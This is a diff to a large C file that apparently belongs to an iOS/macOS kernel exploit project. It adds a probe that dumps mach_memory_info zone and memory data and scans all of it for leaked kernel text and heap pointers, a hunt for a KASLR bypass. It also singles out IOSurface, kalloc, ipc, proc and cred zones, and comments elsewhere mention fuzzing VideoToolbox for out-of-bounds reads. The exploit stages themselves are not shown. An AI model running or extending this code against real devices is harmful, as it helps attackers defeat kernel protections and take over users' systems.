@@ -15902,6 +15902,185 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r374: Deep mach_memory_info dump + zone address scan.
+ * mach_memory_info returned 388 entries in r373 but only .site was scanned.
+ * This probe dumps ALL fields of every entry looking for kernel pointers.
+ * Also dumps zone names/info from the mnames/minfo output params.
+ */
+static void r374_probe(void) {
+    rlog("\n=== r374: Deep mach_memory_info Dump ===\n\n");
+    fflush(stdout);
+
+    mach_port_t host = mach_host_self();
+
+    typedef kern_return_t (*mmi_t)(host_priv_t,
+        mach_zone_name_t**, mach_msg_type_number_t*,
+        mach_zone_info_t**, mach_msg_type_number_t*,
+        mach_memory_info_t**, mach_msg_type_number_t*);
+    mmi_t mmi_fn = (mmi_t)dlsym(RTLD_DEFAULT, "mach_memory_info");
+    if (!mmi_fn) { rlog("  FATAL: mach_memory_info not found\n"); return; }
+
+    mach_zone_name_t *znames = NULL;
+    mach_msg_type_number_t znameCnt = 0;
+    mach_zone_info_t *zinfo = NULL;
+    mach_msg_type_number_t zinfoCnt = 0;
+    mach_memory_info_t *meminfo = NULL;
+    mach_msg_type_number_t meminfoCnt = 0;
+
+    kern_return_t kr = mmi_fn(host, &znames, &znameCnt, &zinfo, &zinfoCnt, &meminfo, &meminfoCnt);
+    rlog("  kr=0x%x znameCnt=%u zinfoCnt=%u meminfoCnt=%u\n", kr, znameCnt, zinfoCnt, meminfoCnt);
+    if (kr != KERN_SUCCESS) { rlog("  FAILED\n"); return; }
+
+    /* ---- Part 1: Dump zone names and scan zone info for kptrs ---- */
+    rlog("\n--- Part 1: Zone names (%u zones) ---\n", znameCnt);
+    fflush(stdout);
+
+    int zone_kptr_count = 0;
+    for (unsigned i = 0; i < znameCnt && i < 200; i++) {
+        /* Scan ALL fields of zinfo[i] for kernel pointers */
+        uint64_t *zraw = (uint64_t*)&zinfo[i];
+        int nfields = (int)(sizeof(mach_zone_info_t) / 8);
+        for (int f = 0; f < nfields; f++) {
+            uint64_t v = zraw[f];
+            if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+                rlog("  *** ZONE[%u] '%s' field[%d]=0x%llx [KTEXT!] ***\n",
+                    i, znames[i].mzn_name, f, (unsigned long long)v);
+                zone_kptr_count++;
+            } else if ((v >> 40) == 0xFFFFFF && v != 0xFFFFFFFFFFFFFFFF) {
+                rlog("  ZONE[%u] '%s' field[%d]=0x%llx [KHEAP]\n",
+                    i, znames[i].mzn_name, f, (unsigned long long)v);
+                zone_kptr_count++;
+            }
+            if (zone_kptr_count >= 50) break;
+        }
+        if (zone_kptr_count >= 50) { rlog("  (truncated)\n"); break; }
+    }
+    if (!zone_kptr_count) rlog("  (no kernel pointers in zone info fields)\n");
+
+    /* Print interesting zone names */
+    rlog("\n  Interesting zones:\n");
+    for (unsigned i = 0; i < znameCnt; i++) {
+        if (strstr(znames[i].mzn_name, "IOSurface") ||
+            strstr(znames[i].mzn_name, "kalloc") ||
+            strstr(znames[i].mzn_name, "ipc") ||
+            strstr(znames[i].mzn_name, "port") ||
+            strstr(znames[i].mzn_name, "proc") ||
+            strstr(znames[i].mzn_name, "task") ||
+            strstr(znames[i].mzn_name, "thread") ||
+            strstr(znames[i].mzn_name, "cred")) {
+            rlog("    [%u] %s: elem=%llu\n", i, znames[i].mzn_name,
+                (unsigned long long)zinfo[i].mzi_elem_size);
+        }
+    }
+
+    /* ---- Part 2: Deep scan of mach_memory_info entries ---- */
+    rlog("\n--- Part 2: mach_memory_info entries (%u) ---\n", meminfoCnt);
+    fflush(stdout);
+
+    int mem_kptr_count = 0;
+    int mem_ktext_count = 0;
+    size_t entry_size = sizeof(mach_memory_info_t);
+    int fields_per_entry = (int)(entry_size / 8);
+    rlog("  entry_size=%zu fields_per=%d\n", entry_size, fields_per_entry);
+
+    for (unsigned i = 0; i < meminfoCnt; i++) {
+        uint64_t *raw = (uint64_t*)&meminfo[i];
+        for (int f = 0; f < fields_per_entry; f++) {
+            uint64_t v = raw[f];
+            if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+                rlog("  *** MEMINFO[%u].field[%d] = 0x%llx [KTEXT!] ***\n",
+                    i, f, (unsigned long long)v);
+                mem_ktext_count++;
+                if (mem_ktext_count >= 30) { rlog("  (truncated ktext)\n"); goto part3; }
+            } else if ((v >> 40) == 0xFFFFFF && v != 0xFFFFFFFFFFFFFFFF) {
+                if (mem_kptr_count < 30) {
+                    rlog("  MEMINFO[%u].field[%d] = 0x%llx [KHEAP]\n",
+                        i, f, (unsigned long long)v);
+                }
+                mem_kptr_count++;
+            }
+        }
+    }
+    rlog("  Total: %d ktext, %d kheap pointers\n", mem_ktext_count, mem_kptr_count);
+
+part3:
+    /* ---- Part 3: Dump first 5 meminfo entries raw ---- */
+    rlog("\n--- Part 3: First 5 meminfo entries (raw) ---\n");
+    fflush(stdout);
+
+    for (unsigned i = 0; i < 5 && i < meminfoCnt; i++) {
+        uint64_t *raw = (uint64_t*)&meminfo[i];
+        rlog("  entry[%u]:", i);
+        for (int f = 0; f < fields_per_entry && f < 12; f++) {
+            rlog(" %016llx", (unsigned long long)raw[f]);
+        }
+        rlog("\n");
+    }
+
+    /* ---- Part 4: Dump raw bytes of zone info struct ---- */
+    rlog("\n--- Part 4: Zone info struct size + first entry raw ---\n");
+    fflush(stdout);
+
+    rlog("  sizeof(mach_zone_info_t) = %zu\n", sizeof(mach_zone_info_t));
+    rlog("  sizeof(mach_memory_info_t) = %zu\n", sizeof(mach_memory_info_t));
+    rlog("  sizeof(mach_zone_name_t) = %zu\n", sizeof(mach_zone_name_t));
+
+    if (zinfoCnt > 0) {
+        uint64_t *raw = (uint64_t*)&zinfo[0];
+        int nf = (int)(sizeof(mach_zone_info_t) / 8);
+        rlog("  zinfo[0] (%s):", znames[0].mzn_name);
+        for (int f = 0; f < nf; f++) rlog(" %016llx", (unsigned long long)raw[f]);
+        rlog("\n");
+    }
+
+    /* ---- Part 5: Scan RAW bytes of returned data for kernel pointers ---- */
+    rlog("\n--- Part 5: Raw byte scan of ALL returned data ---\n");
+    fflush(stdout);
+
+    int raw_ktext = 0, raw_kheap = 0;
+
+    /* Scan zone info raw bytes */
+    uint8_t *zraw_bytes = (uint8_t*)zinfo;
+    size_t zraw_len = zinfoCnt * sizeof(mach_zone_info_t);
+    for (size_t off = 0; off + 8 <= zraw_len; off += 4) {
+        uint64_t v; memcpy(&v, zraw_bytes + off, 8);
+        if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+            rlog("  *** ZINFO raw +0x%zx: 0x%llx [KTEXT!] ***\n", off, (unsigned long long)v);
+            raw_ktext++;
+        }
+        if (raw_ktext >= 10) break;
+    }
+
+    /* Scan meminfo raw bytes */
+    uint8_t *mraw_bytes = (uint8_t*)meminfo;
+    size_t mraw_len = meminfoCnt * sizeof(mach_memory_info_t);
+    for (size_t off = 0; off + 8 <= mraw_len; off += 4) {
+        uint64_t v; memcpy(&v, mraw_bytes + off, 8);
+        if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+            rlog("  *** MEMINFO raw +0x%zx: 0x%llx [KTEXT!] ***\n", off, (unsigned long long)v);
+            raw_ktext++;
+        }
+        if (raw_ktext >= 20) break;
+    }
+
+    /* Scan zone names raw bytes too */
+    uint8_t *nraw_bytes = (uint8_t*)znames;
+    size_t nraw_len = znameCnt * sizeof(mach_zone_name_t);
+    for (size_t off = 0; off + 8 <= nraw_len; off += 4) {
+        uint64_t v; memcpy(&v, nraw_bytes + off, 8);
+        if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+            rlog("  *** ZNAME raw +0x%zx: 0x%llx [KTEXT!] ***\n", off, (unsigned long long)v);
+            raw_ktext++;
+        }
+        if (raw_ktext >= 20) break;
+    }
+
+    rlog("  Raw scan totals: %d ktext, %d kheap\n", raw_ktext, raw_kheap);
+
+    rlog("\n=== r374 complete ===\n");
+    fflush(stdout);
+}
+
 /* r373: Syscall-level KASLR leak hunting.
  * 1) host_zone_info / mach_memory_info — zone metadata addresses.
  * 2) Sysctls: kern.slide, kern.bootargs, kern.version, machdep.*, etc.
@@ -56998,6 +57177,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 377) {
+            rlog("*** rounds=377: Deep mach_memory_info Dump ***\n");
+            rlog("  Scan ALL fields of zone info + memory info for kptrs.\n");
+            rlog("  Raw byte scan of returned data for kernel text pointers.\n\n");
+            fflush(stdout);
+            r374_probe();
+            goto done;
+        }
         if (rounds == 376) {
             rlog("*** rounds=376: Syscall-Level KASLR Leak Hunting ***\n");
             rlog("  host_zone_info, mach_memory_info, sysctls, task_info,\n");
@@ -59217,7 +59404,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -69059,7 +69246,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
